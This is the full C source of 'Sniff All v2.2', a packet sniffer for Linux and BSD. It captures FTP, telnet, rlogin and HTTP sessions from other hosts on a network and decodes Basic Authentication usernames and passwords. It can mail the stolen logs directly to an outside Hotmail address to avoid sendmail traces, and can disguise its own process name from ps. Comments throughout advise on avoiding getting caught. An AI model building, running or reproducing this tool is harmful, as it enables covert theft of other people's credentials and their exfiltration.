/****************************************************************************
 *
 *      Sniff All v2.2 for Linux/*BSD
 *
 * Coded and glued together by Tyler Allison (tyler@electricrain.com)
 *
 * This program sniffs packets for FTP, telnet, POP3, POP2, IMAP2, rlogin in
 * the standard fashion, dumping info to a log file.  It also has the ability
 * to sniff HTTP traffic and decode Basic Authentication username and password
 * pairs. It uses a linked-list (probably should use a hash instead) to keep
 * track of all traffic it sees. This improves the "sniffing" ability of the
 * sniffer so it doesn't get locked into one connection, and misses some
 * other traffic.
 *
 * Supports libpcap (*BSD and Linux) or raw interface sniffing (Linux only).
 * Tested on the following platforms:
 *                 OpenBSD 2.4 (i386)
 *                 Linux 2.2.X /w LSF libpcap (i386)
 *                 Linux 2.2.X  (i386)
 *
 * This program is for non-criminal use ONLY and should not be used unless you
 * have the authorization to do so. Don't blame me if you get busted!
 *
 *
 * This uses code or ideas from the following sniffers:
 * linsniff .03.9beta by Mike Edulla (medulla@infosoc.com)
 * websniff 1.0       by BeastMaster V http://www.rootshell.com
 * linsniff .666      by humble of rhino9
 * pcs                by halflife
 *
 * - Interface initialization code taken from Touch of Death (TOD V.1) by
 *   Brecht Claerhout
 * - Argv hiding taken from nmap v2.03 by 
 *   Fyodor (fyodor@dhp.com, www.insecure.org/nmap)
 *
 * Compile:
 * gcc -o sniffall [OPTIONS] sniffall.c [-lpcap]
 * [OPTIONS]
 *    -DHOST_LOOKUP  : DNS resolve IP addresses
 *    -D__LINUX__    : Compile for Linux (i386)
 *    -D__OpenBSD__  : Compile for OpenBSD (i386) -D__PCAP__ is automatic
 *    -D__PCAP__     : Compile with libpcap support
 *       (Mix and match as needed)
 *
 * Standard build for OpenBSD
 * gcc -o sniffall -D__OpenBSD__ sniffall.c -lpcap
 *
 * Standard builds for Linux
 * gcc -o sniffall -D__LINUX__ sniffall.c     <- no libpcap for linux
 * gcc -o sniffall -D__LINUX__ -D__PCAP__ sniffall.c -lpcap
 * 
 * NOTE: Errors when compiling about ntohl/htonl conflicting types are due to
 * problems in the header files in linux. Find the conflicts and fix them.
 *
 * Changelog:
 *  diff between v2.1 and v2.2
 *     - restructured #defines
 *     - add -l option for command line logfile
 *     - set umask
 *  diff between v2 and v2.1
 *     - added FDDI support
 *     - added auto detect interface support for those using pcap
 *     - Replaced -p with -r..default is to use libpcap now..-r is for
 *       linux folks who want to run the interface raw..and libpcap support
 *       is also compiled in. If libpcap support is not compiled in and you
 *       run it on linux then -r is not needed..it will know to use raw.
 *  diff between v2 and v1:
 *     - added libpcap support
 *     - ported to OpenBSD
 *     - added -i option to override INTERFACE
 *
 * Todo list:
 *     - use hash instead of linked list
 *
 ****************************************************************************/

#ifdef __OpenBSD__
   #ifndef __PCAP__
   #define __PCAP__
   #endif
#endif


#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/queue.h>
#include <net/if.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#ifdef __LINUX__
#include <sys/ioctl.h>
#include <signal.h>
#include <fcntl.h>
#endif


#define INTERFACE "eth0"     /* really only used by Linux raw sniffing */
#define TIMEOUT 30           /* wait 30 seconds before purging connections */

#define MAXIMUM_CAPTURE 256  /* 256 should be fine but you may miss info */
                             /* if the protocol or system is chatty      */
			     /* also increase if you want to see if any  */
			     /* users are 'su'ing to root over a clear   */
			     /* text channel...bad user...bad		 */
		             /* The bigger the number the more memory    */
			     /* the sniffer will use....remember to      */
			     /* modify TIMEOUT as well if you are going  */
			     /* for maximum content sniffing.            */

#define LOGFILE         "/tmp/logfile" /* where to store the logs?? */

#ifdef __PCAP__
       /*
        * This filter should match the case statement in filter()
        * test your filter construct with tcpdump before using it here.
        */
#define FILTER "\
        tcp and (dst port 21 or dst port 23 or dst port 80 or dst port 106 \
        or dst port 109 or dst port 110 or dst port 143 or dst port 513)"
#endif

/* Where to send the email? If you are stupid enough not to change these
 * values you deserve to get caught. We dont use /bin/Mail or such things
 * because they leave traces in the sendmail logs. Just connect directly.
 * Can somebody say hotmail.com?
 */
#define SMTP_GATEWAY "mail.hotmail.com"
#define EMAIL_HEADER "mail from: root@sniffer\nrcpt to: sniffall@hotmail.com\ndata\n"

#define IO_HANDLE       1
#define IO_NONBLOCK     2
#define ISBLANK(x)  (((x) == ' ') || ((x) == '\t'))

/*********************** structures we use ******************/

/* Use the tcphdr and iphdr structs from linux since it's more specific */
/* and makes less of a hassle in porting */
struct my_tcphdr {
    u_int16_t source;
    u_int16_t dest;
    u_int32_t seq;
    u_int32_t ack_seq;
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int16_t res1:4;
    u_int16_t doff:4;
    u_int16_t fin:1;
    u_int16_t syn:1;
    u_int16_t rst:1;
    u_int16_t psh:1;
    u_int16_t ack:1;
    u_int16_t urg:1;
    u_int16_t res2:2;
#elif __BYTE_ORDER == __BIG_ENDIAN
    u_int16_t doff:4;
    u_int16_t res1:4;
    u_int16_t res2:2;
    u_int16_t urg:1;
    u_int16_t ack:1;
    u_int16_t psh:1;
    u_int16_t rst:1;
    u_int16_t syn:1;
    u_int16_t fin:1;
#else
#error  "Adjust your <bits/endian.h> defines"
#endif
    u_int16_t window;
    u_int16_t check;
    u_int16_t urg_ptr;
};

struct my_ip {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    u_int8_t ihl:4;
    u_int8_t version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    u_int8_t    version:4;
    u_int8_t ihl:4;
#else
#error  "Please fix <bytesex.h>"
#endif
    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;
    /*The options start here. */
};

struct etherpacket {
#ifdef __LINUX__
   struct ethhdr eth;
#else
   struct ether_header eth;
#endif
   struct my_ip  ip;
   struct my_tcphdr tcp;
   char buff[8193];
}ep;

struct connection {
        struct connection *next;

        time_t start;
        time_t lasthit;

        unsigned long saddr;
        unsigned long daddr;
        unsigned short sport;
        unsigned short dport;

        unsigned char data[MAXIMUM_CAPTURE];
        int bytes;
};

struct BASE64_PARAMS {
      unsigned long int accum;
      int               shift;
      int               save_shift;
};

/*********************** global variables ******************/
struct my_ip *ip;
struct my_tcphdr *tcp;
typedef struct connection *clistptr;
#ifdef __PCAP__
#include <pcap.h>
pcap_t *ip_socket;
int dlt_len = 0;
#endif

#ifdef __PCAP__
/* We default to libpcap sniffing unless otherwise told */
int pcap_defined = 1;
#else
int pcap_defined = 0;
#endif
clistptr head,tail;
int debug =0;
int email =0;
char hostname[256];
FILE* output;

/********************** begin functions ****************/

int remove_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,int print_data);

/* converts base64 ascii to integer code */
int cvt_ascii( unsigned char alpha )
{
   if      ( (alpha >= 'A') && (alpha <= 'Z') ) return (int)(alpha - 'A');
   else if ( (alpha >= 'a') && (alpha <= 'z') )
        return 26 + (int)(alpha - 'a');
   else if ( (alpha >= '0') && (alpha <= '9' ) )
        return 52 + (int)(alpha - '0');
   else if ( alpha == '+' ) return 62;
   else if ( alpha == '/' ) return 63;
   else if ( alpha == '=' ) return -2;
   else                     return -1;
}


void base64_decode(char *buf,int quit,struct BASE64_PARAMS *d,char *auth_buf)
{
   int index;
   unsigned long int value;
   unsigned char blivit;
   unsigned short j=0;

   index = 0;
   *(auth_buf+0)='\0';

   while ( ISBLANK(buf[index] ) )
   {
      index++;                         /* skip leading blanks */
   }

   for ( index = 0;
         (buf[index] != '\n') &&
         (buf[index] != '\0') &&
         (buf[index] != ' ' );
         index++)
   {

      if (index==(264-5)) return;

      value = cvt_ascii( buf[index] ); /* find chr in base64 alphabet */

      if (value < 64 )               /* if legal */
      {
         d->accum <<= 6;               /* assemble binary accum */
         d->shift += 6;
         d->accum |= value;
         if ( d->shift >= 8 )
         {
            d->shift -= 8;
            value = d->accum >> d->shift;
            blivit = (unsigned char)value & 0xFFl;
            *(auth_buf+j) = (char )blivit;
            j++;
         }

      }
      else                             /* else if out of base64 range */
      {
         quit = 1;                     /* then finished */
         break;
      }
   }

   *(auth_buf+j)='\0';
   return;
}

void decode(char *b64_string, char *user_buff) {
/*
 * this is a nice way to call the base64 decode function
 */
        struct BASE64_PARAMS d_p;
        int quit=0;

        d_p.shift = 0;
        d_p.accum = 0;

        base64_decode((char *)b64_string, quit, &d_p, user_buff);

        return;
}

/* checks for authorization and parses out username and password */
int parse_segment(char *data,unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp) {
        short i;
        short j=0;
        short t=0;
        int got_it = 2;
        char foo[256];
        char user[128];
        char pass[128];

        /* you might want to change this to a more intelligent test */
        if (!strncasecmp(data,"Authorization: Basic",20)) {
                if (strlen(data+21)>sizeof(foo))
                        *(data+21+sizeof(foo-1))='\0';
                decode(data+21,foo);
                for (i=0;foo[i];i++) {
                        if (foo[i]==':')
                                break;
                        user[i]=foo[i];
                }
                user[i]='\0';
                for (++i; foo[i]; i++) {
                        pass[j]=foo[i];
                        j++;
                }
                pass[j]='\0';
                remove_node(sa,da,sp,dp,got_it);
                fprintf(output,"USER: %s\nPASS: %s\n\n",user,pass);
                got_it = 1;
        }
        return got_it;

}

#ifdef __LINUX__
int open_nic(char *nic, char mode) {
/*
 * Open the interface in permisc mode and set some flags for increased
 * performance off the interface. This function improves performance by
 * many factors over the function used in the linsniff beta.
 * Modified from the original code in TOD v1.
 */
        int fd;
        struct ifreq ifinfo;
        struct sigaction rc_sa;
        int fcntl_flag;

        /* create socket and set promisc */
        if ((fd = socket(AF_INET, SOCK_PACKET, htons(0x3)))==-1)
                perror("Failure on socket open."), exit(-1);
        strcpy(ifinfo.ifr_ifrn.ifrn_name,nic);
        if(ioctl(fd, SIOCGIFFLAGS,&ifinfo)<0)
                perror("Failure getting flags."), exit(-1);
        ifinfo.ifr_ifru.ifru_flags |= IFF_PROMISC;
        if(ioctl(fd, SIOCSIFFLAGS,&ifinfo)<0)
                perror("Failure to set flags. (PROMISC)"), exit(-1);

        if(fcntl(fd,F_SETOWN,getpid())<0)
                perror("Failed to set ownership"), exit(-1);

        if(mode&IO_HANDLE) {
                if((fcntl_flag=fcntl(fd,F_GETFL,0))<0)
                        perror("Failed to get flags"), exit(-1);
                if(fcntl(fd,F_SETFL,fcntl_flag|FASYNC|FNDELAY)<0)
                        perror("Failed to set flags"), exit(-1);
        } else {
                if(mode&IO_NONBLOCK) {
                        if((fcntl_flag=fcntl(fd,F_GETFL,0))<0)
                                perror("Failed to get flags"), exit(-1);
                        if(fcntl(fd,F_SETFL,fcntl_flag|FNDELAY)<0)
                                perror("Failed to set flags"), exit(-1);
                }
        
        }

        return fd;
}
#endif __LINUX__

char *hostlookup(unsigned long int in) {
/*
 * Offer the option to do hostname lookups or just print IP's.
 * Hostname lookups will slow down the sniffer but will provide
 * easier to read logs. Your choice.
 *
 */
   static char host[1024];

#ifdef HOST_LOOKUP
   struct in_addr i;
   int lookup = 0;
   struct hostent *he;

   i.s_addr=in;
   he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
   if(he == NULL) strcpy(host, (char *)inet_ntoa(i));
   else strcpy(host, he->h_name);
#else
   sprintf(host,"%s",inet_ntoa(in));
#endif

   return host;
}

void add_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp) {
/*
 * Add the host pair to the list we are keeping.
 *
 */
        clistptr newnode;

        newnode=(clistptr)malloc(sizeof(struct connection));
        newnode->saddr=sa;
        newnode->daddr=da;
        newnode->sport=sp;
        newnode->dport=dp;
        newnode->bytes=0;
        newnode->next=NULL;
        time(&(newnode->start));
        time(&(newnode->lasthit));
        if (!head)
        {
                head=newnode;
                tail=newnode;
        }
        else
        {
                tail->next=newnode;
                tail=newnode;
        }
}

char *pretty(time_t *t) {
/*
 * Print out nice pretty time stamps
 *
 */
        char *time;
        time=ctime(t);
        time[strlen(time)-6]=0;
        return time;
}


int remove_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,int print_data) {
/*
 * We no longer need to watch this connection so throw it off the list and
 * print what we know. If it's a port 80 connection pass the data to the
 * authentication decoder.
 *
 */
   clistptr walker,prev;
   int i=0;
   int t=0;
   int sockfd;
   char *data;
   char temp_buf[1024];
#ifdef __LINUX__
   struct sockaddr_in   serv_addr;
#endif
   struct hostent *host;

   if (head) {
      walker=head;
      prev=head;
      while (walker) {
         if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport) {
            prev->next=walker->next;
            if (walker==head) {
               head=head->next;;
               prev=NULL;
            }

            if (walker==tail) { tail=prev; }

            /* initialize email connection */

            if (email) {
#ifdef __LINUX__
                if ((host = gethostbyname(SMTP_GATEWAY)) ==NULL) {
                   printf("failed gethostbyname\n");
                   exit(-1);
                }
        
                serv_addr.sin_family      = AF_INET;
                serv_addr.sin_addr        = *((struct in_addr*)host->h_addr_list[0]);
                serv_addr.sin_port        = htons(strtol("25",NULL,10));

                if ( (sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0) {
                    printf("failed email socket\n");
                    exit (-1);
                }

                if (connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)  {
                    printf("failed email connect\n");
                    exit (-1);
                }

                /* let's be nice...say hello tommy. */
                sprintf(temp_buf,"HELO %s\n",hostname);
                write(sockfd,temp_buf,(unsigned int)strlen(temp_buf));
                write(sockfd,EMAIL_HEADER,(unsigned int)strlen(EMAIL_HEADER));
#else
	    printf("Email support only for linux\n");
	    email = 0;
#endif  __LINUX_
	    }

            if (print_data >= 1) {
               if (email) {
                   sprintf(temp_buf,"=========================%s====================\n",hostname);
                   write(sockfd,temp_buf,(unsigned int)strlen(temp_buf));
                   bzero(temp_buf,strlen(temp_buf));
                   sprintf(temp_buf,"Time: %s     Size: %d\nPath: %s",pretty(&(walker->start)),walker->bytes,hostlookup(sa));
                        write(sockfd,temp_buf,(unsigned int)strlen(temp_buf));
                   bzero(temp_buf,strlen(temp_buf));
                   sprintf(temp_buf," => %s [%d]\n------------------------------------------------------------\n",hostlookup(da),ntohs(dp));
                   write(sockfd,temp_buf,(unsigned int)strlen(temp_buf));
                   bzero(temp_buf,strlen(temp_buf));
               } else {
                  fprintf(output,"============================================================\n");
                  fprintf(output,"Time: %s     Size: %d\nPath: %s",pretty(&(walker->start)),walker->bytes,hostlookup(sa));
                  fprintf(output," => %s [%d]\n------------------------------------------------------------\n",hostlookup(da),ntohs(dp));
               }
            }
	    fflush(output);
            if(print_data == 1) {
               for (i=0;i<walker->bytes;i++) {
                  if (walker->data[i]==13) {
                     if (email) write(sockfd,"\n",(unsigned int)strlen("\n"));
                     else fprintf(output,"\n");
                     t=0;
                  }
                  if (isprint(walker->data[i])) {
                     if (email) {
                        sprintf(temp_buf,"%c",walker->data[i]);
                        write(sockfd,temp_buf,(unsigned int)strlen(temp_buf));
                        bzero(temp_buf,strlen(temp_buf));
                     } else fprintf(output,"%c",walker->data[i]);
                     t++;
                  }
                  if (t>75) {
                     t=0;
                     if (email) write(sockfd,"\n",(unsigned int)strlen("\n"));
                     else fprintf(output,"\n");
                  }
               }
               if (email) {
                  write(sockfd,"\n.\n",(unsigned int)strlen("\n.\n"));
               } else fprintf(output,"\n");
	       fflush(output);
            }

            free (walker);
            return 1;
         }
         prev=walker;
         walker=walker->next;
      }
   }
}


void purgeidle() {
/*
 * Watch for idle connections and throw them off the list
 *
 */
        clistptr walker;
        time_t curtime;
        int print_data;
        walker=head;
        signal(SIGALRM, purgeidle);
        alarm(5);
        if(debug) fprintf(output,"Purging idle connections...\n");

        time(&curtime);
        while (walker)
        {
          print_data = 0;
          if (curtime - walker->lasthit  > TIMEOUT) {
             if(debug) fprintf(output,"Removing node: %s,%d,%s,%d\n",inet_ntoa(walker->saddr),ntohs(walker->sport),inet_ntoa(walker->daddr),ntohs(walker->dport));
             if(ntohs(walker->dport)==80) print_data = 0;
             remove_node(walker->saddr,walker->daddr,walker->sport,walker->dport,print_data);
             walker=head;
          } else {
             walker=walker->next;
          }
        }
}



int log_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,char *buffer) {
/*
 * Hello connection! Mind if we watch? And the data to our list.
 *
 */
        clistptr walker;
        int got_it = 0;
        int print_data = 0;
        int i,t=0;
        int bytes=0;
        char data_buff[MAXIMUM_CAPTURE];

	bytes = strlen(buffer);
        walker=head;
        while (walker)
        {
          /*
           * run down the list to see if we are suppose to watch 
	   * this connection
           */
          got_it = 0;
          print_data = 0;
          if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport) {
            time(&(walker->lasthit));
            strncpy(walker->data+walker->bytes,buffer,MAXIMUM_CAPTURE-walker->bytes);
            walker->bytes=walker->bytes+bytes;
            if(ntohs(dp) == 80) {
                /*
                 * since we know what we are looking for we parse
                 */
                for(i=0;i != bytes;i++) {
                   if(buffer[i] == 13) {
                        data_buff[t]='\0';
                        got_it=parse_segment(data_buff,sa,da,sp,dp);
                        print_data = 0;
                        t=0;
                   }
                   if(isprint(buffer[i])) {
                        data_buff[t]=buffer[i];
                        t++;
                   }
                   if(t > 255) {
                        t=0;
                        data_buff[t]='\0';
                        got_it=parse_segment(data_buff,sa,da,sp,dp);
                        print_data = 0;
                   }
                }
            }
            if ( (walker->bytes>=MAXIMUM_CAPTURE) || got_it) {
               remove_node(sa,da,sp,dp,print_data);
               return 1;
            }
          }
          walker=walker->next;
        }
}


int filter(void) {
   int i,t;
   int print_data = 1;

   if(ip->protocol != 6) return 0;

   /*
    * we could skip the switch statement if using libpcap but double
    * check anyway just to make sure packets didnt make it through the
    * libpcap filter..i'll figure out a cleaner way to do this later
    */
   switch(ntohs(tcp->dest)) {
      case 21:  /* ftp */
      case 23:  /* telnet */
      case 80:  /* http */
      /* case 106: */ /* pop3 */
      /* case 109: */ /* pop2 */
      /* case 110: */ /* imap2 */
      /* case 143: */ /* imap */
      case 513: /* login */
        if(tcp->syn == 1) {
              if (debug) fprintf(output,"Adding node syn %s,%d,%s,%d.\n",inet_ntoa(ip->saddr),ntohs(tcp->source),inet_ntoa(ip->daddr),ntohs(tcp->dest));
              add_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);

        }
        if ( (tcp->rst == 1) || (tcp->fin == 1)) {
            if (debug) fprintf(output,"Removed node %s,%d,%s,%d.\n",inet_ntoa(ip->saddr),ntohs(tcp->source),inet_ntoa(ip->daddr),ntohs(tcp->dest));
            if(ntohs(tcp->dest)==80) print_data = 0;
            remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest,print_data);

        }
        /*
         * it's a data packet...log it!
         */
        if (debug) fprintf(output,"Logging node\n");
	if (pcap_defined) log_node(ip->saddr,ip->daddr,tcp->source,tcp->dest, ep.buff);
	else log_node(ip->saddr,ip->daddr,tcp->source,tcp->dest, ep.buff-2);
        break;
      default:
        break;
   }
}

#ifdef __PCAP__
void filter_packet(u_char *u, struct pcap_pkthdr *p, u_char *packet)
{
   #define IP_SIZE      20
   #define TCP_SIZE     20
   unsigned short ip_options = 0;
   unsigned short tcp_options = 0;
   struct my_ip *b_ip;
   u_char *data;
   static u_char *align_buf=NULL;


   /*
    * Begin packet ripping magic. ewww..
    */
   if(p->len < (dlt_len + IP_SIZE + TCP_SIZE)) return;
   b_ip = (struct my_ip *)(packet + dlt_len);
   if(align_buf == NULL) align_buf = (u_char *)malloc(1024);
   bcopy((char *)b_ip, (char *)align_buf, p->len);
   packet = align_buf;
   b_ip = (struct my_ip *)align_buf;
   ip = (struct my_ip *)align_buf;
   ip_options = b_ip->ihl;
   ip_options -= 5;
   ip_options *= 4;
   tcp = (struct my_tcphdr *)(packet + IP_SIZE + ip_options);
   tcp_options = tcp->doff;
   tcp_options -= 5;
   tcp_options *= 4;
   data = packet + (IP_SIZE + ip_options + TCP_SIZE + tcp_options);
   /* copy data over to the ep struct so we can use filter() without */
   /* issues.  */
   bzero(ep.buff,strlen(ep.buff));
   bcopy((char *)data,ep.buff,strlen(data));
   bcopy((char *)packet,(struct etherpacket *)&ep,strlen(packet));

   filter(); 
}
#endif

#ifdef __LINUX__
int read_tcp(int s) {
/*
 * Pull the packets off the wire!!...hurry!
 *
 */
   int x;

   for (;;) {
      while(1) {
         x=read(s,(struct etherpacket *)&ep,sizeof(ep));
         if (x > 1)
           {
              if (filter()==0) continue;
              x=x-54;
              if (x<1) continue;
              break;
           }
      }
   }
}
#endif __LINUX__

void usage(char *argv[]) {

        printf("SniffAll v2.2\n");
        printf("Usage: %s [-deho] [-f argvname] [-l logfile] [-i interface]\n",argv[0]);
        printf("\n");
        printf("-d : Debug mode\n");
        printf("-e : Send logs (NOT DEBUG) via email\n");
        printf("-h : Usage info\n");
        printf("-o : Send output to stdout instead of logfile\n");
        printf("       if using with -e ONLY debug info will be logged\n");
#ifdef __LINUX__
	printf("-r : Use raw linux interface for packet sniffing.\n");
#endif
	printf("-f : The program name to show to 'ps' and the like\n");
	printf("-l : Where to store the logs.\n");
	printf("-i : Use this interface instead of searching for one.\n\n");
        printf("Common usage:\n");
        printf("   %s     : log info to logfile\n",argv[0]);
        printf("   %s -eo : send info via email and don't use local log\n\n",argv[0]);
        exit(-1);
}

#ifdef __LINUX__
int linux_read_interface(char *interface) {
   /*
    * open the network device
    */
   int fd;
   fd = open_nic(interface, IO_NONBLOCK);
   read_tcp(fd);
}
#endif

#ifdef __PCAP__
int pcap_read_interface(char *interface) {
   char errbuf[PCAP_ERRBUF_SIZE];
   u_int32_t localnet, netmask;
   struct bpf_program fcode;
	
   if (pcap_defined) {
      if (interface == NULL) {
         interface = pcap_lookupdev(errbuf);
         printf("Found interface: %s\n",interface);
         if (interface == NULL) {
            printf("interface not found: %s\n",errbuf);
            exit(-1);
         }
      }
      ip_socket = pcap_open_live(interface,1024,1,1024,errbuf);
      if (ip_socket == NULL) {
         printf("pcap_open_live failed: %s\n",errbuf);
         exit(-1);
      }
      switch (pcap_datalink(ip_socket)) {
         case DLT_EN10MB:
                 dlt_len = 14;
                 break;
         case DLT_FDDI:
                 dlt_len = 21;
                 break;
         default:
                 printf("Don't know the link type...assuming 10MB ethernet\n");
                 dlt_len = 14;
                 break;    
      }
      if (pcap_lookupnet(interface, &localnet, &netmask, errbuf) < 0) {
         localnet = 0;
         netmask = 0;
         printf("%s", errbuf);
         exit(-1);
      }
      if (pcap_compile(ip_socket, &fcode, FILTER, 1, netmask) < 0) {
         printf("%s", pcap_geterr(ip_socket));
         exit(-1);
      }
      if (pcap_setfilter(ip_socket, &fcode) < 0) {
         printf("%s", pcap_geterr(ip_socket));
         exit(-1);
      }
      while(1) {
         pcap_loop(ip_socket, -1, (pcap_handler)filter_packet, NULL);
      }
      exit(-1);
   } else {
      printf("Something is wacked you shouldn't get here!\n");
      exit(-1);
   }
}
#endif __PCAP__



int main(int argc, char *argv[]) {
        int c;
	int argvlen;
	int j;
	int i;
	char *interface;
	char *argvname = NULL;
	char *logfile;
#ifdef __PCAP__
	char *cmdbuf;
#endif

	interface = NULL;
	logfile = LOGFILE;
	umask(066);
        /*
         * setup the globals for use
         */
        ip=(struct my_iphdr *)(((unsigned long)&ep.ip)-2);
        tcp=(struct my_tcphdr *)(((unsigned long)&ep.tcp)-2);

        if (gethostname(hostname,255) != 0) {
           perror("gethostname: ");
           printf("gethostname failed\n");
        }

        while((c=getopt(argc,argv,"dehorf:l:i:"))!=EOF)
                switch(c) {
                   case 'd':
                        debug = 1;
                        break;
                   case 'e':
                        email = 1;
                        break;
                   case 'h':
                        usage(argv);
                        break;
                   case 'o' :
                        output=stdout;
                        break;
                   case 'r' :
			pcap_defined = 0;
			break;
		   case 'l' :
		        logfile = optarg;
		        break;
		   case 'f' :
			argvname=optarg;
			break;
		   case 'i' :
			interface=optarg;
			break;
                }

	if (argvname) {
	   argvlen=strlen(argv[0]);
	   if (argvlen < strlen(argvname)) {
	      printf("If you want to fake the argv you need to call the program with a longer name\n");
	      exit(-1);
	   }
	   strncpy(argv[0], argvname, strlen(argvname));
  	   for(i = strlen(argvname); i < argvlen; i++) argv[0][i] = '\0';
  	   for(i=1; i < argc; i++) {
    	      argvlen = strlen(argv[i]);
    	      for(j=0; j <= argvlen; j++)
      	         argv[i][j] = '\0';
  	   }
	}
        if (output != stdout) {
           output = fopen(logfile, "at");
           if (output == NULL) {
	      printf("Logfile '%s' not openned!\n",logfile);
	      exit(-1);
	   }
        }
        purgeidle(); /* setup the auto purge sigalarm */


	if (pcap_defined) {

#ifdef __PCAP__
	   printf("Using libpcap\n");
           pcap_read_interface(interface);
#else
	   /* Shouldn't get here but if you do print warning */
	   printf("You didn't compile with PCAP support\n");
#endif

	} else {

#ifdef __LINUX__
	   if (interface == NULL) interface = INTERFACE;
	   printf("Using Linux raw\n");
           linux_read_interface(interface);
#else
	   printf("I don't know what you want me to use to sniff! Try compiling with __PCAP__ support\n");
#endif
	}
}
